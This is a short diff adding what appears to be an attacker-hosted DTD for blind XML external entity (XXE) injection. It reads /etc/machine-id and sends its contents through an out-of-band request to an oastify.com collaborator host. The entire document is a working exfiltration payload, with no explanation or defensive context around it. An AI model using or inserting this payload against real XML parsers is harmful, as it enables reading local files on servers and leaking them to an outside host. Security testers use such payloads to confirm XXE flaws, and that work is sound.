@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///etc/machine-id">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://z77iz2se4vhicvrch1lo73jqghm8a3ys.oastify.com/?data=%file;'>">
+%eval;
+%exfil;
